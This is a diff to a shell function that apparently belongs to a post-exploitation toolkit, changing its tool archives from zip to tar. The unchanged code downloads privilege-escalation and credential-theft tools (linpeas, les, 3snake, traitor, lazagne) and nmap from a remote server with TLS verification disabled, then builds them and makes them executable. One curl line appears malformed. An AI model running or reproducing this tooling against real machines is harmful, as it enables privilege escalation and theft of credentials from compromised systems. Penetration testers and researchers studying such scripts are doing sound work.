@@ -60,8 +60,8 @@ download_tools() {
     then
         wget --no-check-certificate -q "$server_url/tools/linpeas.sh"
         wget --no-check-certificate -q "$server_url/tools/les.sh"
-        wget --no-check-certificate -q "$server_url/tools/nmap.zip"
-        wget --no-check-certificate -q "$server_url/tools/3snake.zip"
+        wget --no-check-certificate -q "$server_url/tools/nmap.tar"
+        wget --no-check-certificate -q "$server_url/tools/3snake.tar"
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
             wget --no-check-certificate -q "$server_url/tools/traitor-amd64"
@@ -76,8 +76,8 @@ download_tools() {
     then
         curl -s -k "$server_url/tools/linpeas.sh" -o linpeas.sh
         curl -s -k "$server_url/tools/les.sh" -o les.sh
-        curl -s -k "$server_url/tools/nmap.zip" -o nmap.zip
-        curl -s -k "$server_url/tools/3snake.zip" -o 3snake.zip
+        curl -s -k "$server_url/tools/nmap.tar" -o nmap.tar
+        curl -s -k "$server_url/tools/3snake.tar" -o 3snake.tar
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
             curl -s -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
@@ -89,12 +89,12 @@ download_tools() {
             curl -s -k "$server_url/tools/lazagne32" -o lazagne32
         fi
     fi
-    unzip -qq nmap.zip
-    unzip -qq 3snake.zip
+    tar -xf nmap.tar
+    tar -xf 3snake.tar
     cd 3snake/ || exit
     make
     cd ..
-    rm nmap.zip 3snake.zip
+    rm nmap.tar 3snake.tar
     chmod -R +x *
 }
 
